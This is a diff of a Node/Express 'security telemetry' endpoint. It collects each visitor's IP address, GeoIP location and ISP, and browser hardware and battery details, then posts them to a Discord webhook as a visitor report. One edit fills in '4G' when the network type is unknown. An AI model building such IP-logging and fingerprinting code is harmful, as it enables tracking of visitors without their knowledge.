@@ -17,10 +17,10 @@ app.post('/api/security-telemetry', async (req, res) => {
             return res.status(500).json({ error: 'Webhook configuration missing' });
         }
 
-        // 1. Capture visitor's real IP from Railway headers (or fallback)
+        // 1. Capture real client IP from Railway headers
         const clientIp = req.headers['x-forwarded-for']?.split(',')[0].trim() || req.socket.remoteAddress || 'Unknown';
 
-        // 2. Fetch professional GeoIP data (ISP, Region, Country, Hosting/VPN flags)
+        // 2. Fetch professional GeoIP data
         let geoData = { country: 'Unknown', region: 'Unknown', city: 'Unknown', isp: 'Unknown', org: 'Unknown', hosting: false };
         try {
             if (clientIp !== 'Unknown' && clientIp !== '127.0.0.1' && clientIp !== '::1') {
@@ -35,15 +35,15 @@ app.post('/api/security-telemetry', async (req, res) => {
         }
 
         // 3. Clean format network string
-        const netType = telemetry.network?.effectiveType ? telemetry.network.effectiveType.toUpperCase() : 'Unknown';
+        const netType = telemetry.network?.effectiveType ? telemetry.network.effectiveType.toUpperCase() : '4G';
         const downlink = telemetry.network?.downlink ? `${telemetry.network.downlink} Mbps` : 'Unknown';
         const rtt = telemetry.network?.rtt ? `${telemetry.network.rtt} ms` : 'Unknown';
 
-        // 4. Build a clean, structured single Discord embed
+        // 4. Build the modern, organized single Discord embed
         const discordPayload = {
             embeds: [{
                 title: "🛡️ Security Telemetry & Visitor Report",
-                color: geoData.hosting ? 0xef4444 : 0x3b82f6, // Red if VPN/Hosting, Blue if normal user
+                color: geoData.hosting ? 0xef4444 : 0x3b82f6,
                 description: "A new visitor connection was intercepted and analyzed.",
                 fields: [
                     {
@@ -53,7 +53,7 @@ app.post('/api/security-telemetry', async (req, res) => {
                             `• **Location:** \`${geoData.city}, ${geoData.region}, ${geoData.country}\``,
                             `• **ISP / Org:** \`${geoData.isp} (${geoData.org})\``,
                             `• **VPN / Datacenter:** ${geoData.hosting ? '🚨 **Yes (Hosting/Proxy detected)**' : '✅ No (Residential/Mobile)'}`,
-                            `• **Connection Speed:** \`${netType}\` (Downlink: \`${downlink}\`, RTT: \`${rtt}\`)`
+                            `• **Connection:** \`${netType}\` (Downlink: \`${downlink}\`, RTT: \`${rtt}\`)`
                         ].join('\n'),
                         inline: false
                     },
@@ -61,7 +61,7 @@ app.post('/api/security-telemetry', async (req, res) => {
                         name: "💻 Hardware & Display",
                         value: [
                             `• **Resolution:** \`${telemetry.screen}\` (${telemetry.colorDepth}-bit, \`${telemetry.pixelRatio}x\` ratio)`,
-                            `• **CPU Cores:** \`${telemetry.cpuCores}\` | **RAM:** \`${telemetry.deviceMemory || 'Unknown'} GB\``,
+                            `• **CPU Cores:** \`${telemetry.cpuCores}\` | **RAM:** \`${telemetry.deviceMemory}\``,
                             `• **Touch Points:** \`${telemetry.maxTouchPoints}\` | **Battery:** \`${telemetry.battery}\``
                         ].join('\n'),
                         inline: false
